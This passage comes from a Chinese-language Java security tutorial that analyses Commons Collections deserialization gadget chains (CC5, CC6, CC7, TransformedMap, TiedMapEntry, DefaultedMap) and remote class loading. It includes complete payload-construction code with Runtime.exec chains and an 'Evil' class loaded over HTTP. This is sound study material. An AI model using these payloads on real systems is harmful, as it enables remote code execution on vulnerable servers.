entry.\n\t@SuppressWarnings(&quot;unchecked&quot;)\n\t\tEntry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];\n\ttab[index] = new Entry&lt;&gt;(hash, key, value, e);\n\tcount++;\n}\n首先 reconstitutionPut 方法的逻辑是，如果 key 不存在于当前 tab 中，则创建新的 entry。而想触发调用 e.key.equals(key)，则需要满足以下条件：\n\n有两个 key(LazyMap) 的 index 相同，index 的计算方式为 (hash &amp; 0x7FFFFFFF) % tab.length，0x7FFFFFFF 表示一律转换为正数（所以，index 相同不代表 hash 相同）。\n有两个 key(LazyMap) 的 hash 值也相同『e.hash == hash』，大致的逻辑是第一个放入的 key(LazyMap) 不存在，被放入成员 tab 中，第二次再放入一个 key(LazyMap) ，它的 hash 值与前者相同，触发 e.key.equals(key)。\n\n那如何才能让两个 LazyMap 的 hash 值相同呢？\n首先前面示例中 LazyMap 的底层 map 为 HashMap，而它的 hashCode 方法为 AbstractMap#hashCode 方法如下，可以看到计算方法为遍历 entrySet 累加它们的 hash 值，\npublic int hashCode() {\n\tint h = 0;\n\tIterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();\n\twhile (i.hasNext())\n\t\th += i.next().hashCode();\n\treturn h;\n}\n而 HashMap#entrySet 的实现如下，直接返回内部的 Map.Entry&lt;K,V&gt;()，\npublic Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() {\n\tSet&lt;Map.Entry&lt;K,V&gt;&gt; es;\n\treturn (es = entrySet) == null ? (entrySet = new EntrySet()) : es;\n}\n \n但实现类是 HashMap$Node&lt;K,V&gt;，hashCode 方法如下\npublic final int hashCode() {\n\treturn Objects.hashCode(key) ^ Objects.hashCode(value);\n}\n所以最简单的方式，只需要让两个 LazyMap 的 key 和 value 都相同即可。那是不是把代码改成这样就行？\nLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), fake);\nlazyMap.put(&quot;kk&quot;, &quot;v1&quot;);\n \nLazyMap lazyMap2 = (LazyMap) LazyMap.decorate(new HashMap(), fake);\nlazyMap2.put(&quot;kk&quot;, &quot;v1&quot;);\n \nHashtable hashtable = new Hashtable&lt;&gt;();\nhashtable.put(lazyMap, 1);\nhashtable.put(lazyMap2, 2);\n当然不可以，查看一下 Hashtable#put 方法，如果它们的哈希值相同且 lazyMap.equals(lazyMap2) == true，Hashtable 就没法同时容纳它们两个，lazyMap2 是放不进去。而 equals 方法的实现在这里就是 AbstractMap#equals，只要内部的 key 和 value 都相同即可。\npublic synchronized V put(K key, V value) {\n\t// Make sure the value is not null\n\tif (value == null) {\n\t\tthrow new NullPointerException();\n\t}\n \n\t// Makes sure the key is not already in the hashtable.\n\tEntry&lt;?,?&gt; tab[] = table;\n\tint hash = key.hashCode();\n\tint index = (hash &amp; 0x7FFFFFFF) % tab.length;\n\t@SuppressWarnings(&quot;unchecked&quot;)\n\tEntry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];\n\tfor(; entry != null ; entry = entry.next) {\n\t\tif ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) { // [4] 调用 AbstractMap#equals 方法。\n\t\t\tV old = entry.value;\n\t\t\tentry.value = value;\n\t\t\treturn old;\n\t\t}\n\t}\n \n\taddEntry(hash, key, value, index);\n\treturn null;\n}\n为此需要一种方式，能够在 Hashtable#put 之前保证两个 LazyMap 的 hash 值的计算结果不同，在 Hashtable#put 之后，又让它们的 hash 值的计算结果相同。但直接做到这一点几乎是不可能的事情。\n所以需要思考另一种方式解决这个问题，\n这里回看 AbstractMap#equals，你是否会觉得熟悉，前面的示例里提到过 AbstractMap#equals 能够调用到 LazyMap#get 方法。而这可以使得被放入的 LazyMap 的 hash 值的计算结果发生变化（LazyMap#get 方法会根据 factory 成员插入新元素），这听上去不错，因为可通过 LazyMap#remove 方法让 hash 值的计算结果恢复原样。\n到这里似乎有办法完成前面设想的后半部分了，但是要知道若想触发 [4] 的调用，需要满足一些条件，前后插入的两个 LazyMap 的 hash 值相同；value 不为 null。\n下面思考一个问题，前面的示例 lazyMap.put(&quot;kk&quot;, &quot;v1&quot;); lazyMap2.put(&quot;kk&quot;, &quot;v1&quot;); ，会触发 AbstractMap#equals，那么会触发 LazyMap#get 方法吗？如果触发了，为什么 lazyMap2 的 hash 值计算结果没有发生变化。\n\n答案是：会触发，但是因为两者的 key 都是 kk，而 lazyMap2 中已经有了 kk 关联的 value，所以不会插入新元素了。\n\n那么最后，只剩下一点需要解决，能不能找到一种情况，让 lazyMap 和 lazyMap2 到 hash 值相同但是 key 不相同。根据前面的分析可以知道，如过使用 HashMap 的话 hash 的计算方式为\npublic final int hashCode() {\n\treturn Objects.hashCode(key) ^ Objects.hashCode(value);\n}\n假定 value 相同，只考虑 key，可以通过暴力枚举的方式找到两个 key，它们的 Objects.hashCode(key) 相同。\n这两个 key 值就是 yy 和 zZ，当然此答案不唯一。\nLazyMapHashTableExec.java\n有了前面的分析结果，就可以开始编写利用链构造代码了\npublic static Object getObject() throws Exception {\n\tChainedTransformer fakeTransformer =\n\t\tnew ChainedTransformer(new Transformer[] {new ConstantTransformer(&quot;1&quot;)});\n\tChainedTransformer chainedTransformer =\n\t\tnew ChainedTransformer(\n\t\t\tnew Transformer[] {\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;invoke&quot;,\n\t\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;exec&quot;,\n\t\t\t\t\tnew Class[] {String.class},\n\t\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t\t});\n \n\tLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap&lt;&gt;(), fakeTransformer);\n\tlazyMap.put(&quot;yy&quot;, 1);\n \n\t// 于 lazyMap 的 hash 值计算结果相同，但是 key 不同\n\tLazyMap lazyMap2 = (LazyMap) LazyMap.decorate(new HashMap&lt;&gt;(), fakeTransformer);\n\tlazyMap2.put(&quot;zZ&quot;, 1);\n \n\tHashtable hashtable = new Hashtable&lt;&gt;();\n\thashtable.put(lazyMap, 1);\n\thashtable.put(lazyMap2, 2);\n \n\tReflections.setFieldValue(lazyMap2, &quot;factory&quot;, chainedTransformer);\n\t// 此时 lazyMap2 size 为 2，删除多余内容，恢复 lazyMap2 的 hash 值计算结果\n\tlazyMap2.remove(&quot;yy&quot;);\n \n\treturn hashtable;\n}\n简化版调用关系梳理\n反序列化时的调用过程\nHashtable.readObject\n  // 插入第一个 Entry， key 为 lazyMap\n  Hashtable.reconstitutionPut\n  // 插入第二个 Entry， key 为 lazyMap\n  Hashtable.reconstitutionPut\n    // 与 lazyMap 的 hash 相同，触发 equals 调用\n    (e.hash == hash) &amp;&amp; e.key.equals(key)\n \n      AbstractMap&lt;K,V&gt;.equals\n        // 调用 get 方法，实际触发的为 lazyMap2.get(key)，进而触发 transformer 执行命令。\n        value.equals(m.get(key))\nysoserial/CommonsCollections7\n以下为 CommonsCollections7 的构造代码。\npublic Hashtable getObject(final String command) throws Exception {\n \n\t// Reusing transformer chain and LazyMap gadgets from previous payloads\n\tfinal String[] execArgs = new String[]{command};\n \n\tfinal Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n \n\tfinal Transformer[] transformers = new Transformer[]{\n\t\tnew ConstantTransformer(Runtime.class),\n\t\tnew InvokerTransformer(&quot;getMethod&quot;,\n\t\t\tnew Class[]{String.class, Class[].class},\n\t\t\tnew Object[]{&quot;getRuntime&quot;, new Class[0]}),\n\t\tnew InvokerTransformer(&quot;invoke&quot;,\n\t\t\tnew Class[]{Object.class, Object[].class},\n\t\t\tnew Object[]{null, new Object[0]}),\n\t\tnew InvokerTransformer(&quot;exec&quot;,\n\t\t\tnew Class[]{String.class},\n\t\t\texecArgs),\n\t\tnew ConstantTransformer(1)};\n \n\tMap innerMap1 = new HashMap();\n\tMap innerMap2 = new HashMap();\n \n\t// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject\n\tMap lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);\n\tlazyMap1.put(&quot;yy&quot;, 1);\n \n\tMap lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);\n\tlazyMap2.put(&quot;zZ&quot;, 1);\n \n\t// Use the colliding Maps as keys in Hashtable\n\tHashtable hashtable = new Hashtable();\n\thashtable.put(lazyMap1, 1);\n\thashtable.put(lazyMap2, 2);\n \n\tReflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);\n \n\t// Needed to ensure hash collision after previous manipulations\n\tlazyMap2.remove(&quot;yy&quot;);\n \n\treturn hashtable;\n}\nTransformedMap 利用链\nTransformedMap 可以说是 LazyMap 的孪生兄弟，都出自 commons-collections 库中，且都继承自 AbstractMapDecorator\n\n根据公开资料，最早讲到 TransformedMap 应该是 Code White 的这篇 Slide：Exploiting\nDeserialization Vulnerabilities in Java，国内最早在长亭科技的博客文章《Lib 之过？Java 反序列化漏洞通用利用分析》中出现。\n\n前面内容中已经介绍了 LazyMap 的特点，调用 get 方法时，若 key 值不存在，则根据 factory(Transformer) 成员创建一个对应的 value。\n而 TransformedMap 和它类似，当调用 put 方法时支持通过 keyTransformer|valueTransformer(Transformer) 来修改插入的内容。\npublic Object put(Object key, Object value) {\n\tkey = this.transformKey(key);\n\tvalue = this.transformValue(value);\n\treturn this.getMap().put(key, value);\n}\nTransformedMapExec.java\n那么类似的，可通过下面的代码触发命令执行。\npublic class TransformedMapExec {\n    public static void main(String[] args) {\n        ChainedTransformer chainedTransformer =\n                new ChainedTransformer(\n                        new Transformer[] {\n                            new ConstantTransformer(Runtime.class),\n                            new InvokerTransformer(\n                                    &quot;getMethod&quot;,\n                                    new Class[] {String.class, Class[].class},\n                                    new Object[] {&quot;getRuntime&quot;, new Class[0]}),\n                            new InvokerTransformer(\n                                    &quot;invoke&quot;,\n                                    new Class[] {Object.class, Object[].class},\n                                    new Object[] {null, new Object[0]}),\n                            new InvokerTransformer(\n                                    &quot;exec&quot;,\n                                    new Class[] {String.class},\n                                    new Object[] {&quot;calc&quot;})\n                        });\n        // chainedTransformer 作为第二个参数也可以\n        TransformedMap transformedMap =\n                (TransformedMap) TransformedMap.decorate(new HashMap&lt;&gt;(), chainedTransformer, null);\n        transformedMap.put(&quot;k&quot;, &quot;v&quot;);\n    }\n}\n那么如何触发 TransformedMap#put 方法呢？答案还是那个熟悉的 AnnotationInvocationHandler，在它的 readObject 方法中会调用 memberValue.setValue。实际调用的也就是 TransformedMap$MapEntry#setValue\npublic Object setValue(Object value) {\n\tvalue = this.parent.checkSetValue(value); // [5]\n\treturn super.entry.setValue(value);\n}\n[5] 进一步调用 checkSetValue，而 TransformedMap 实现了自己的 checkSetValue 方法，\nprotected Object checkSetValue(Object value) {\n\treturn this.valueTransformer.transform(value);\n}\n\n需要注意这里使用的是 valueTransformer，所以在完整的利用链构造代码中 chainedTransformer 作为第二个参数才对。\n\nTransformedMapAnnotationExec.java\n思路有了，那就上代码吧\npublic static Object getObject() throws Exception {\n\tChainedTransformer chainedTransformer =\n\t\t\tnew ChainedTransformer(\n\t\t\t\t\tnew Transformer[] {\n\t\t\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;invoke&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\t\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;exec&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t\t\t\t});\n \n\tTransformedMap transformedMap =\n\t\t\t(TransformedMap) TransformedMap.decorate(new HashMap&lt;&gt;(), null, null);\n\ttransformedMap.put(&quot;type&quot;, 1);\n \n\tInvocationHandler handler =\n\t\t\t(InvocationHandler)\n\t\t\t\t\tReflections.getFirstCtor(\n\t\t\t\t\t\t\t\t\t&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)\n\t\t\t\t\t\t\t.newInstance(AMXMetadata.class, transformedMap);\n\tReflections.setFieldValue(transformedMap, &quot;valueTransformer&quot;, chainedTransformer);\n \n\treturn handler;\n}\n这里有有几个问题说明以下，为了触发 memberValue.setValue，需要满足如下条件\nClass&lt;?&gt; memberType = memberTypes.get(name);\n\tif (memberType != null) {  // i.e. member still exists\n\t\tObject value = memberValue.getValue();\n\t\tif (!(memberType.isInstance(value) ||\n\t\t                      value instanceof ExceptionProxy))\n\nmemberType 不为 null\nmemberType.isInstance(value) （memberType 的类型与 value 不相同），或 value instanceof ExceptionProxy （value 类型不是 ExceptionProxy）\n\n而 memberType 是通过 annotationType.memberTypes(); 获取的，通过注释可以了解到，它获取的就是注解中声明的方法，以及返回参数的映射关系，类型为 HashMap 。想满足上面的条件非常简单，随意找了一个 JDK 内置的注解类 AMXMetadata，过程不多赘述了。\nTiedMapEntry 利用链\n前面已经提过 CC1 和 CC7 利用链，从 CC1 到 CC7，出发点是解决高版本 JDK 无法使用的问题，通过 HashTable 来衔接 LazyMap。\n这里介绍另一种方式 TiedMapEntry，注释中写道这个类的功能是可以动态改变内部 map 的内容。\n\nThis can be used to enable a map entry to make changes on the underlying map, however this will probably mess up any iterators.\n\nTiedMapEntry 可以被序列化，但没有实现自定义的 readObject 方法。不过这不是需要关注的内容，来看看它的 hashCode 方法\npublic int hashCode() {\n\tObject value = getValue();\n\treturn (getKey() == null ? 0 : getKey().hashCode()) ^\n\t\t   (value == null ? 0 : value.hashCode());\n}\n \npublic Object getValue() {\n\treturn map.get(key); // 触发 get 方法\n}\nhashCode 方法会触发 get 方法，如果 map 类型为 LazyMap 那么就能够执行命令\nTiedMapEntryExec.java\n按照思路可以很快写出下面的代码\npublic static void main(String[] args){\n\tChainedTransformer chainedTransformer =\n\t\tnew ChainedTransformer(\n\t\t\tnew Transformer[] {\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;invoke&quot;,\n\t\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;exec&quot;,\n\t\t\t\t\tnew Class[] {String.class},\n\t\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t\t});\n \n\tLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);\n \n\tTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;k&quot;);\n\ttiedMapEntry.hashCode();\n}\nTiedMapEntryHashMapExec.java\n如何连接起 TiedMapEntry#hashCode 和 某个 readObject 方法？可以想一想 hashCode 方法在哪些类中会经常用到，HashMap、Hashtable、HashSet、ConcurrentHashMap 等。这些都是 JDK 中的基础类。\n以 HashMap 为例，可构造如下利用链\npublic static Object getObject() throws Exception {\n\tChainedTransformer fakeTransformer =\n\t\tnew ChainedTransformer(new Transformer[] {new ConstantTransformer(&quot;1&quot;)});\n\tChainedTransformer chainedTransformer =\n\t\tnew ChainedTransformer(\n\t\t\tnew Transformer[] {\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;invoke&quot;,\n\t\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;exec&quot;,\n\t\t\t\t\tnew Class[] {String.class},\n\t\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t\t});\n \n\tLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap&lt;&gt;(), fakeTransformer);\n \n\tTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;fake&quot;);\n \n\tHashMap hashMap = new HashMap&lt;&gt;();\n\thashMap.put(tiedMapEntry, &quot;v&quot;);\n \n\tReflections.setFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);\n\t// 修改 key 的值，从而触发 LazyMap#get 中 factory.transform 方法的执行\n\tReflections.setFieldValue(tiedMapEntry, &quot;key&quot;, &quot;k&quot;);\n \n\treturn hashMap;\n}\n\n其它可以自由探索了\n\n简化版调用关系梳理\n整个链条不算复杂，下面为调用链梳理\nHashMap.readObject\n  // 反序列化 TiedMapEntry\n  (K) s.readObject();\n  // 计算 tiedMapEntry 的 hash 值\n  hash(key)\n    // 调用 tiedMapEntry.hashCode 方法\n    key.hashCode()\n \n      Object value = getValue();\n        // 触发 LazyMap.get 方法，实现命令执行\n        map.get(key);\nysoserial/CommonsCollections6\nCC6 中使用的是 HashSet，整个构造过程显得有点臃肿，这里仅列出代码不进行分析了。\npublic Serializable getObject(final String command) throws Exception {\n \n\tfinal String[] execArgs = new String[] { command };\n \n\tfinal Transformer[] transformers = new Transformer[] {\n\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] {\n\t\t\t\t\tString.class, Class[].class }, new Object[] {\n\t\t\t\t\t&quot;getRuntime&quot;, new Class[0] }),\n\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] {\n\t\t\t\t\tObject.class, Object[].class }, new Object[] {\n\t\t\t\t\tnull, new Object[0] }),\n\t\t\tnew InvokerTransformer(&quot;exec&quot;,\n\t\t\t\t\tnew Class[] { String.class }, execArgs),\n\t\t\tnew ConstantTransformer(1) };\n \n\tTransformer transformerChain = new ChainedTransformer(transformers);\n \n\tfinal Map innerMap = new HashMap();\n \n\tfinal Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n \n\tTiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);\n \n\tHashSet map = new HashSet(1);\n\tmap.add(&quot;foo&quot;);\n\tField f = null;\n\ttry {\n\t\tf = HashSet.class.getDeclaredField(&quot;map&quot;);\n\t} catch (NoSuchFieldException e) {\n\t\tf = HashSet.class.getDeclaredField(&quot;backingMap&quot;);\n\t}\n \n\tReflections.setAccessible(f);\n\tHashMap innimpl = (HashMap) f.get(map);\n \n\tField f2 = null;\n\ttry {\n\t\tf2 = HashMap.class.getDeclaredField(&quot;table&quot;);\n\t} catch (NoSuchFieldException e) {\n\t\tf2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);\n\t}\n \n\tReflections.setAccessible(f2);\n\tObject[] array = (Object[]) f2.get(innimpl);\n \n\tObject node = array[0];\n\tif(node == null){\n\t\tnode = array[1];\n\t}\n \n\tField keyField = null;\n\ttry{\n\t\tkeyField = node.getClass().getDeclaredField(&quot;key&quot;);\n\t}catch(Exception e){\n\t\tkeyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);\n\t}\n \n\tReflections.setAccessible(keyField);\n\tkeyField.set(node, entry);\n \n\treturn map;\n \n}\nBadAttributeValueExpException 利用链\nBadAttributeValueExpException 只在 CC5 中使用过，它可以配合前面提到的 TiedMapEntry 类构造完整的利用链。\n它的 readObject 方法如下\nprivate void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {\n\tObjectInputStream.GetField gf = ois.readFields();\n\tObject valObj = gf.get(&quot;val&quot;, null);\n \n\tif (valObj == null) {\n\t\tval = null;\n\t} else if (valObj instanceof String) {\n\t\tval= valObj;\n\t} else if (System.getSecurityManager() == null\n\t\t\t|| valObj instanceof Long\n\t\t\t|| valObj instanceof Integer\n\t\t\t|| valObj instanceof Float\n\t\t\t|| valObj instanceof Double\n\t\t\t|| valObj instanceof Byte\n\t\t\t|| valObj instanceof Short\n\t\t\t|| valObj instanceof Boolean) {\n\t\tval = valObj.toString(); // [6]\n\t} else { // the serialized object is from a version without JDK-8019292 fix\n\t\tval = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();\n\t}\n}\n注意其中的 valObj.toString() 方法调用，再回过头看看 TiedMapEntry#toString 方法，其中也会调用 getValue 方法。\npublic String toString() {\n\treturn getKey() + &quot;=&quot; + getValue();\n}\nBadAttributeValueExpExceptionExec.java\n有了前面的基础，通过如下代码构造利用链\npublic static Object getObject() throws Exception {\n\tChainedTransformer fakeTransformer =\n\t\tnew ChainedTransformer(new Transformer[] {new ConstantTransformer(&quot;1&quot;)});\n\tChainedTransformer chainedTransformer =\n\t\tnew ChainedTransformer(\n\t\t\tnew Transformer[] {\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;invoke&quot;,\n\t\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t&quot;exec&quot;,\n\t\t\t\t\tnew Class[] {String.class},\n\t\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t\t});\n \n\tLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap&lt;&gt;(), fakeTransformer);\n \n\tTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;fake&quot;);\n \n\tBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n\t// 修改 val 的值，避免序列化时触发 toString 方法\n\tReflections.setFieldValue(badAttributeValueExpException, &quot;val&quot;, tiedMapEntry);\n\t// 修改 key 的值，从而触发 LazyMap#get 中 factory.transform 方法的执行\n\tReflections.setFieldValue(tiedMapEntry, &quot;key&quot;, &quot;k&quot;);\n \n\tReflections.setFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);\n \n\treturn badAttributeValueExpException;\n}\nysoserial/CommonsCollections5\nCC5 的实现与 BadAttributeValueExpExceptionExec.java 是几乎一致的，不赘述。\npublic BadAttributeValueExpException getObject(final String command) throws Exception {\n\tfinal String[] execArgs = new String[] { command };\n\t// inert chain for setup\n\tfinal Transformer transformerChain = new ChainedTransformer(\n\t\t\tnew Transformer[]{ new ConstantTransformer(1) });\n\t// real chain for after setup\n\tfinal Transformer[] transformers = new Transformer[] {\n\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] {\n\t\t\t\tString.class, Class[].class }, new Object[] {\n\t\t\t\t&quot;getRuntime&quot;, new Class[0] }),\n\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] {\n\t\t\t\tObject.class, Object[].class }, new Object[] {\n\t\t\t\tnull, new Object[0] }),\n\t\t\tnew InvokerTransformer(&quot;exec&quot;,\n\t\t\t\tnew Class[] { String.class }, execArgs),\n\t\t\tnew ConstantTransformer(1) };\n \n\tfinal Map innerMap = new HashMap();\n \n\tfinal Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n \n\tTiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);\n \n\tBadAttributeValueExpException val = new BadAttributeValueExpException(null);\n\tField valfield = val.getClass().getDeclaredField(&quot;val&quot;);\n\tReflections.setAccessible(valfield);\n\tvalfield.set(val, entry);\n \n\tReflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain\n \n\treturn val;\n}\n简化版调用关系梳理\nBadAttributeValueExpException.readObject\n  // 调用 TiedMapEntry.toString() 方法\n  valObj.toString();\n \n    Object value = getValue();\n      // 触发 LazyMap.get 方法，实现命令执行\n      map.get(key);\n调试问题\n由于 Runtime.exec 自身实现的一些问题（抱歉，我也不知道具体是什么问题），当你下断点时，可能会遇到还未到 LazyMap 的 get 方法，就已经弹窗。\n此时可能会误以为，LazyMap#get 方法没有执行 factory.transform(key);，这会影响调试过。所以在学习和分析时，可以使用 fakeTransformer，而没必要真的使用能够命令执行的 Transformer。\nDefaultedMap\n\n这部分是后续补充的。\n\n除了 LazyMap，commons-collection4:4.0 中（3.x 中仅 3.2.x 有）有另一个类 DefaultedMap，同样继承自 AbstractMapDecorator，也是一个装饰器类。\n它的 get 方法是不是十分熟悉，不能说和 LazyMap 一模一样，但可以说是十分相似了。\npublic V get(final Object key) {\n\t// create value for key if key is not currently in the map\n\tif (map.containsKey(key) == false) {\n\t\treturn value.transform((K) key);\n\t}\n\treturn map.get(key);\n}\nBadAttributeValueExpExceptionDefaultedMapExec.java\n那么将 LazyMap 替换成 DefaultedMap 同样可以构造一条利用链。\npublic static Object getObject() throws Exception {\n\tConstantTransformer fakeTransformer = new ConstantTransformer(&quot;1&quot;);\n\tChainedTransformer chainedTransformer =\n\t\t\tnew ChainedTransformer(\n\t\t\t\t\tnew Transformer[] {\n\t\t\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;invoke&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\t\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;exec&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t\t\t\t});\n \n\tDefaultedMap defaultedMap = new DefaultedMap(fakeTransformer);\n \n\tTiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap, &quot;fake&quot;);\n \n\tBadAttributeValueExpException badAttributeValueExpException =\n\t\t\tnew BadAttributeValueExpException(null);\n\t// 修改 val 的值，避免序列化时触发 toString 方法\n\tReflections.setFieldValue(badAttributeValueExpException, &quot;val&quot;, tiedMapEntry);\n\t// 修改 key 的值，从而触发 LazyMap#get 中 factory.transform 方法的执行\n\tReflections.setFieldValue(tiedMapEntry, &quot;key&quot;, &quot;k&quot;);\n \n\tReflections.setFieldValue(defaultedMap, &quot;value&quot;, chainedTransformer);\n \n\treturn badAttributeValueExpException;\n}\n简化版调用关系梳理\nBadAttributeValueExpException.readObject\n  // 调用 TiedMapEntry.toString() 方法\n  valObj.toString();\n \n    Object value = getValue();\n      // 触发 DefaultedMap.get 方法，实现命令执行\n      map.get(key);\nTemplatesImpl 利用链\n前面介绍的利用链的都是围绕 Transformer 达到命令执行的，但在 Java 中想要做到命令执行，有很多种方式。而其中一种，就是字节码的动态加载，字节码是针对 JVM 的一种指令集，理论上对于任何语言，只要能将源代码编译成 字节码就可以在 JVM 上执行。\n例如，Java、Kotlin、Groovy、Scala 等。\n在 Java 安全 - 反射 中有提到过 Class.forName 方法默认进行初始化操作从而执行静态块中的内容，对于类加载器来说可能有点不一样。\nURLClassLoaderExec.java\n下面演示通过 URLClassLoader 加载远程的 class 文件。\npublic static void main(String[] args)\n            throws Exception {\n \n\tURL[] urls = {new URL(&quot;http://localhost:8000/&quot;)};\n\tURLClassLoader loader = URLClassLoader.newInstance(urls);\n\tClass&lt;?&gt; c = loader.loadClass(&quot;Evil&quot;);\n\tc.newInstance();\n}\n \npublic class Evil {\n    static {\n        try {\n            Runtime.getRuntime().exec(&quot;open -a calculator&quot;);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n通常情况下，Java 会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找 class 文件来加载，而这个基础路径有分为三种情况：\n\nURL 未以斜杠 / 结尾，则认为是一个 jar 文件，使用 JarLoader 来寻找类，即在 Jar 包中寻找 class 文件\nURL 以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即在本地文件系统中寻找 class 文件\nURL 以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类\n\nURLClassLoader 则常用于 http 协议，当然 Java 的 URL 支持的协议远不止 http 这一种，这里先不关注。\n测试 http 协议，可以看到 static 块中的代码被成功执行。\n\nClassLoader#defineClass\nJava 中类的加载通过分为下面 3 个过程 loadClass→ findClass→ defineClass\n\nloadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass\nfindClass 的作用是根据基础 URL 